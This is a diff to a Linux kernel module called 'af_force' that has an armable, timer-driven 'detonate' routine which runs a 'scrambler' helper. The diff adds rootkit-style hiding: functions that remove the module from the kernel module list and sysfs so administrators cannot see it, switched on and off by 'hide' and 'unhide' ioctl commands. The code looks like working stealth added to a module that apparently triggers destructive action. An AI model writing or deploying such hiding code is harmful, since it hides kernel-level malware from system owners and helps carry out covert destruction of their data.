@@ -18,11 +18,15 @@
 
 MODULE_LICENSE("GPL");
 
-/*  state 0: disarmed. default 
-    state 1: armed.         */
+/*  armed 0: disarmed. default 
+    armed 1: armed.         */
+int armed = 0;
 
-int state = 0;
+int hidden = 0;
 static struct timer_list countdown_timer;
+
+static struct list_head *modlist;
+
 
 static int call_scrambler(void) {
 	// struct subprocess_info *sub_info;
@@ -44,6 +48,22 @@ static int call_scrambler(void) {
 	return 0;
 }
 
+
+static void hide_me(void) {
+	if (hidden) return;
+	modlist = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	THIS_MODULE->sect_attrs = NULL;
+	THIS_MODULE->notes_attrs = NULL;
+	hidden=1;
+}
+
+static void unhide_me(void) {
+	if (hidden == 0) return;
+	list_add(&THIS_MODULE->list, modlist);
+	hidden = 0;
+}
 
 static int device_open(struct inode *inode, struct file *file)
 {
@@ -75,20 +95,29 @@ static long device_ioctl(struct file *filp, unsigned int cmd, unsigned long args
         case IOCTL_CMD:
             printk(KERN_INFO "af_force: got msg %s\n", (char *)args);
 
-            // Arm/Disarm Logic:
+            // Arm/Disarm & Hide/Unhide Logic:
             // strcmp 0 is match
             // printk("strcmp result: %i\n", strcmp(msg, "arm"));
             if (strcmp(msg, "arm") == 0) {
                 // arm
                 printk(KERN_INFO "af_force: arming...\n");
-                state = 1;
+                armed = 1;
 
             } else if (strcmp(msg, "disarm") == 0) {
                 // disarm
                 printk(KERN_INFO "af_force: disarming...\n");
-                state = 0;
-            }
+                armed = 0;
 
+            } else if (strcmp(msg, "hide") == 0) {
+                // disarm
+                printk(KERN_INFO "af_force: hiding...\n");
+                hide_me();
+
+            } else if (strcmp(msg, "unhide") == 0) {
+                // disarm
+                printk(KERN_INFO "af_force: unhiding...\n");
+                unhide_me();
+            }
             break;
     }
     return 0;
@@ -96,7 +125,7 @@ static long device_ioctl(struct file *filp, unsigned int cmd, unsigned long args
 
 void detonate (unsigned long data)
 {
-    if (state == 1 ) {
+    if (armed == 1 ) {
         printk(KERN_DEBUG "af_force: Kaboom!\n");
         int res = call_scrambler();
         printk(KERN_DEBUG "uesrmodehelper_exec result: %i", res);
